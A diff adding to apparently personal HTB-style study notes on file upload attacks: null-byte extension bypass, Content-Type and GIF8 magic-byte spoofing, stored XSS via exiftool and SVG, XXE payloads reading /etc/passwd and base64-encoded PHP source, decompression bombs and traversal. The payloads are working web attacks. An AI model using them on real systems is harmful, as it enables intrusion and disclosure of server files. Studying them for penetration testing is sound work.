@@ -121,3 +121,61 @@ Another whitelist bypass we can do is character injection.
 - .
 - …
 - :
+
+Ending a filetype with %00 will work on bypassing on PHP servers with version 5.X or earlier (shell.php%00.jpg)
+
+### Type filters
+
+Other sites may validate based on the Content-Type or File Content data.
+
+Content-Type: We can change this value with repeater, or fuzz it in intruder with the content-type.txt file from seclists.
+
+File Content: We can add types to the beginning of a file payload like `GIF8` to fool the filters into thinking it is a GIF file, and changing the Content-Type as well. 
+
+## Other File Upload Attacks
+
+### XSS 
+
+We can introduce stored XSS in some file attacks, we can add it in using exiftool like this:
+
+```
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
+
+XSS attacks can also be carried with SVG images like so
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+### XXE
+
+Can abuse XXE on a site like so:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+or this to read source page files and encode it for easier exploitation
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+### DoS
+
+We can also put in a Denial of Service attack if we wanted by doing something like a `Decompression Bomb`. 
+
+
+### File traversal
+
+If the upload functionality is also vulnerable to directory traversal we may also attempt uploading files to a different directory. If overwriting certain files that can also cause the server to crash.
